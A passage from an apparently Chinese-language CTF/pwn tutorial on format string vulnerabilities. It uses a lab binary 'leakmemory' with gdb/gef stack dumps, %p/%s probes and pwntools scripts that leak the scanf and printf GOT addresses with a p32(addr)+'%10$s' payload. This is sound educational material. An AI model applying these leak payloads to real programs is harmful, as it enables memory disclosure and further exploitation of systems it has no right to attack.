            nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()gef➤  cContinuing.00000001.22222222.ffffffff.%sBreakpoint 1, __printf (format=0xffffd008 "%s") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  0x00007325 ("%s"?)$ebx   : 0x0       $ecx   : 0x7fffffe2$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe4│+0x0008: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7e4d66d                  nop       0xf7e4d66e                  xchg   ax, ax → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret          0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret          0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%s")[#1] 0x804852c → main()gef➤  cContinuing.%s[Inferior 1 (process 4344) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，在第二次执行printf函数的时候，确实将0xffffcfe4处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p><p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p><p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 4 个参数，如下，此时程序就不能够解析，就崩溃了。</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory %3$s00000001.22222222.ffffffff.%3$sSegmentation fault (core dumped)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>小技巧总结</strong></p><blockquote><ol><li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li><li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li><li>利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。</li></ol></blockquote><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p><p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串在栈上的(因为是某个函数的局部变量，本例中s是main函数的局部变量)。那么也就是说，在调用输出函数的时候，其实，<strong>第一个参数的值其实就是该格式化字符串的地址。</strong>我们选择上面的某个函数调用为例</p><pre class="line-numbers language-shell"><code class="language-shell">Breakpoint 1, __printf (format=0xffffd008 "%s") at printf.c:2828    in printf.c[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffffd008  →  0x00007325 ("%s"?)$ebx   : 0x0       $ecx   : 0x7fffffe2$edx   : 0xf7fb7870  →  0x00000000$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10$ebp   : 0xffffd078  →  0x00000000$esi   : 0xf7fb6000  →  0x001b1db0$edi   : 0xf7fb6000  →  0x001b1db0$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp0xffffcfe0│+0x0004: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe4│+0x0008: 0xffffd008  →  0x00007325 ("%s"?)0xffffcfe8│+0x000c: 0xf7ffd918  →  0x000000000xffffcfec│+0x0010: 0x00f0b5ff0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x000000000xffffcff4│+0x0018: 0x000000010xffffcff8│+0x001c: 0x000000c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffd008,同时该地址存储的也确实是”%s”格式化字符串内容。</p><p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p><pre><code>addr%k$s</code></pre><blockquote><p>注：在这里，如果格式化字符串在栈上，那么我们就一定能确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少地域格式化字符串地址8字节或者16字节。</p></blockquote><p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p><pre><code>[tag]%p%p%p%p...</code></pre><p>一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其它字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p><pre><code>devil@ubuntu:~$ ./leakmemory AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pAAAA0xff9e92880xf7f959180xf0b5ff0xff9e92ae0x10xc20x10x222222220xffffffff0x414141410x702570250x702570250x702570250x702570250x70257025</code></pre><p>这里0x414141处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第11个参数，也是格式化字符串的第10个参数。(此处和CTF-Wiki上有出入)我们可以来测试一下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory %10$s00000001.22222222.ffffffff.%10$sSegmentation fault (core dumped)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。具体的可以参考下面的调试。</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemorygef➤  rStarting program: /home/devil/leakmemory %10$s00000001.22222222.ffffffff.%10$sProgram received signal SIGSEGV, Segmentation fault.__strlen_ia32 () at ../sysdeps/i386/i686/multiarch/../../i586/strlen.S:5151    ../sysdeps/i386/i686/multiarch/../../i586/strlen.S: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0x24303125 ("%10$"?)$ebx   : 0x0       $ecx   : 0xf7fb6000  →  0x001b1db0$edx   : 0x1       $esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x10$ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000$esi   : 0xffffc680  →  0xffffffff$edi   : 0xf7fb6d60  →  0xfbad2a84$eip   : 0xf7e795cf  →  <__strlen_ia32+15> cmp BYTE PTR [eax], dh$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffffc4ec│+0x0000: 0xf7e45977  →  <printf_positional+7575> add esp, 0x10     ← $esp0xffffc4f0│+0x0004: "%10$"0xffffc4f4│+0x0008: 0x000000000xffffc4f8│+0x000c: 0x00000028 ("("?)0xffffc4fc│+0x0010: 0x000000000xffffc500│+0x0014: 0xffffd008  →  "%10$s"0xffffc504│+0x0018: 0x000000000xffffc508│+0x001c: 0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7e795c8 <__strlen_ia32+8> add    BYTE PTR [ecx], ah   0xf7e795ca <__strlen_ia32+10> ret    0x2474   0xf7e795cd <__strlen_ia32+13> jp     0xf7e795e6 <__strlen_ia32+38> → 0xf7e795cf <__strlen_ia32+15> cmp    BYTE PTR [eax], dh   0xf7e795d1 <__strlen_ia32+17> je     0xf7e79676 <__strlen_ia32+182>   0xf7e795d7 <__strlen_ia32+23> inc    eax   0xf7e795d8 <__strlen_ia32+24> cmp    BYTE PTR [eax], dh   0xf7e795da <__strlen_ia32+26> je     0xf7e79676 <__strlen_ia32+182>   0xf7e795e0 <__strlen_ia32+32> inc    eax─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7e795cf in __strlen_ia32 (), reason: SIGSEGV───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e795cf → __strlen_ia32()[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x0, nspecs_done=0x0, lead_str_end=0xffffd008 "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)[#3] 0xf7e4d696 → __printf(format=0xffffd008 "%10$s")[#4] 0x804852c → main()gef➤  help x/Examine memory: x/FMT ADDRESS.ADDRESS is an expression for the memory address to examine.FMT is a repeat count followed by a format letter and a size letter.Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),  t(binary), f(float), a(address), i(instruction), c(char), s(string)  and z(hex, zero padded on the left).Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).The specified number of objects of the specified size are printedaccording to the format.Defaults for format and size letters are those previously used.Default count is 1.  Default address is following last thing printedwith this command or "print".gef➤  x/x 0xffffd0080xffffd008:    0x24303125gef➤  vmmap[ Legend:  Code | Heap | Stack ]Start      End        Offset     Perm Path0x08048000 0x08049000 0x00000000 r-x /home/devil/leakmemory0x08049000 0x0804a000 0x00000000 r-- /home/devil/leakmemory0x0804a000 0x0804b000 0x00001000 rw- /home/devil/leakmemory0x0804b000 0x0806c000 0x00000000 rw- [heap]0xf7e03000 0xf7e04000 0x00000000 rw- 0xf7e04000 0xf7fb4000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so0xf7fb4000 0xf7fb6000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so0xf7fb6000 0xf7fb7000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so0xf7fb7000 0xf7fba000 0x00000000 rw- 0xf7fd3000 0xf7fd4000 0x00000000 rw- 0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.23.so0xfffdd000 0xffffe000 0x00000000 rw- [stack]gef➤  x/x 0x243031250x24303125:    Cannot access memory at address 0x24303125<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然0xffffd008处所对应的格式化字符串所对应的变量值0x24303125并不能够被该程序访问，所以程序自然就崩溃了。</p><p>那么如果我们设置一个可以访问的地址呢？比如说scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址了。我们不妨来试一下。</p><p>首先，获取scanf@got的地址，如下</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  got/home/devil/leakmemory:     file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE 08049ffc R_386_GLOB_DAT    __gmon_start__0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.00804a010 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.40804a014 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.00804a018 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面我们利用pwntools构造payload如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>__isoc99_scanf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>__isoc99_scanf_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%10$s'</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#remove the first bytes of __isoc99_scanf@got</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实，我们使用gdb.attach(sh)来进行调试。当我们运行到第二个printf函数的时候(要在调试窗口用 “b printf”命令给printf函数下断点)，可以看到我们的第四个参数(stack上第一个地址是返回地址，第二个是格式化字符串地址，之后依次为第一…四个参数)确实指向我们的scanf的地址，这里输出</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7f1d87c  →  0x00000000$esp   : 0xff8ccb9c  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xff8ccc48  →  0x00000000$esi   : 0xf7f1c000  →  0x001b1db0$edi   : 0xf7f1c000  →  0x001b1db0$eip   : 0xf7db3670  →  <printf+0> call 0xf7e89b59 <__x86.get_pc_thunk.ax>$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff8ccb9c│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xff8ccba0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xff8ccba4│+0x0008: 0x000000010xff8ccba8│+0x000c: 0x222222220xff8ccbac│+0x0010: 0xffffffff0xff8ccbb0│+0x0014: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp0xff8ccbb4│+0x0018: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp0xff8ccbb8│+0x001c: 0xf7f63918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7db3667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7db366d                  nop       0xf7db366e                  xchg   ax, ax → 0xf7db3670 <printf+0>       call   0xf7e89b59 <__x86.get_pc_thunk.ax>   ↳  0xf7e89b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7e89b5c <__x86.get_pc_thunk.ax+3> ret          0xf7e89b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7e89b60 <__x86.get_pc_thunk.dx+3> ret          0xf7e89b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7e89b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7db3670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7db3670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在我们运行的terminal下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py[+] Starting local process './leakmemory': pid 2673[*] '/home/devil/leakmemory'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)0x804a018\x18\x04%10$s[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 2673 -x "/tmp/pwnqnvV9v.gdb"[+] Waiting for debugger: Done0xf7dc60c0[*] Switching to interactive mode[*] Process './leakmemory' stopped with exit code 0 (pid 2673)[*] Got EOF while reading in interactive$  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们确实得到了scanf的地址。</p><blockquote><p>Wiki上这里是用scanf举例说明的，并且表示之所以没有使用printf函数，是因为printf函数会对0a,0b,0c,00等字符有一些奇怪的处理，导致无法正常读入。</p></blockquote><p>所以我就尝试了一下泄露printf函数的地址。</p><p>构造payload如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./leakmemory'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'%10$s'</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'%10$s\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>terminal运行结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py[+] Starting local process './leakmemory': pid 2747[*] '/home/devil/leakmemory'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)0x804a00c\x0c\x04%10$s[*] running in new terminal: /usr/bin/gdb -q  "./leakmemory" 2747 -x "/tmp/pwn71yrFD.gdb"[+] Waiting for debugger: DoneTraceback (most recent call last):  File "exp.py", line 11, in <module>    print(hex(u32(sh.recv()[4:8])))  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 82, in recv    return self._recv(numb, timeout) or b''  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 160, in _recv    if not self.buffer and not self._fillbuffer(timeout):  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 131, in _fillbuffer    data = self.recv_raw(self.buffer.get_fill_size())  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/process.py", line 707, in recv_raw    raise EOFErrorEOFError[*] Process './leakmemory' stopped with exit code -11 (SIGSEGV) (pid 2747)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>栈上的值如下</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  cContinuing.Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xffc82d58  →  0x250804a0$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7eca87c  →  0x00000000$esp   : 0xffc82d1c  →  0x0804851d  →  <main+98> add esp, 0x20$ebp   : 0xffc82dc8  →  0x00000000$esi   : 0xf7ec9000  →  0x001b1db0$edi   : 0xf7ec9000  →  0x001b1db0$eip   : 0xf7d60670  →  <printf+0> call 0xf7e36b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xffc82d1c│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp0xffc82d20│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"0xffc82d24│+0x0008: 0x000000010xffc82d28│+0x000c: 0x222222220xffc82d2c│+0x0010: 0xffffffff0xffc82d30│+0x0014: 0xffc82d58  →  0x250804a00xffc82d34│+0x0018: 0xffc82d58  →  0x250804a00xffc82d38│+0x001c: 0xf7f10918  →  0x00000000─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7d60667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7d6066d                  nop       0xf7d6066e                  xchg   ax, ax → 0xf7d60670 <printf+0>       call   0xf7e36b59 <__x86.get_pc_thunk.ax>   ↳  0xf7e36b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7e36b5c <__x86.get_pc_thunk.ax+3> ret          0xf7e36b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7e36b60 <__x86.get_pc_thunk.dx+3> ret          0xf7e36b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7e36b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "leakmemory", stopped 0xf7d60670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7d60670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")[#1] 0x804851d → main()<span aria-hidden="true" 